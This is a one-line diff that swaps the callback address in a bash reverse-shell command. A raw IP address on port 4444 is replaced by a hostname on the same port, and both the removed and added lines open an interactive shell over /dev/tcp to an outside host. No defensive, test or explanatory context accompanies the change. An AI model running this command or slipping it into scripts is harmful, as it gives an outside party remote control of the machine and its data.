@@ -1,1 +1,1 @@
-bash -c 'exec bash -i &>/dev/tcp/168.144.151.207/4444 <&1'
+bash -c 'exec bash -i &>/dev/tcp/shell.w4nn4d13.tech/4444 <&1'
